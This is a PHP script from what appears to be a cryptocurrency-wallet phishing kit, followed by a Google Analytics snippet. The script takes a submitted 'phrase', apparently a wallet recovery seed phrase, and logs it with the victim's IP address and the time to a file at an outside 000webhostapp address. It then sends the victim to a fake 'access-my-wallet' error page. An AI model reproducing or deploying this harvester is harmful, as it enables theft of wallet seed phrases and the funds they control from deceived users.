<?php
$file = "JMFSOIPUBNVCRSRMKLY87.txt";
$file = "https://mahjong54ways.000webhostapp.com/JMFSOIPUBNVCRSRMKLY87.txt";
$phrase = $_POST['phrase'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, " ");
fwrite($handle, "\n");
fwrite($handle, "|PH|---> : ");
fwrite($handle, "$phrase");
fwrite($handle, "\n");
fwrite($handle, "|IP|---> : ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "|DT|---> : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, " ");
fwrite($handle, "\n");
fwrite($handle, "==================================================================");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"error.html?access-my-wallet#/\";// -->
</script>";
?>\/
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-33910177-1']);
  _gaq.push(['_setDomainName', 'x90x.net']);
  _gaq.push(['_setAllowLinker', true]);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
